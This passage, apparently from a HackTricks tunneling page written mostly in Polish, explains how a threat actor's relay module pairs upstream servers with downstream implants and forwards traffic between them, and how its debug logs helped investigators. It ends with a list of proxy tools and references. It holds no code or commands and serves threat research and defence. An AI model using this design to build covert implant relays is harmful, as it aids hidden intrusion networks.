* **Orkiestracja relay** – moduł utrzymuje dwie listy: „servers” (węzły upstream) oraz „clients” (implanty downstream). Wpisy są usuwane, jeśli przez około 30 sekund nie nadejdzie heartbeat. Gdy obie listy nie są puste, moduł łączy pierwszy zdrowy serwer z pierwszym zdrowym klientem i po prostu przekazuje bajty między ich socketami do momentu zamknięcia jednej ze stron.
* **Telemetry debugowania** – opcjonalne logowanie rejestruje źródłowy adres IP, docelowy adres IP oraz całkowitą liczbę przekazanych bajtów dla każdej pary. Ślady te pomogły śledczym odtworzyć mesh ShadowPad obejmujący wiele ofiar.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
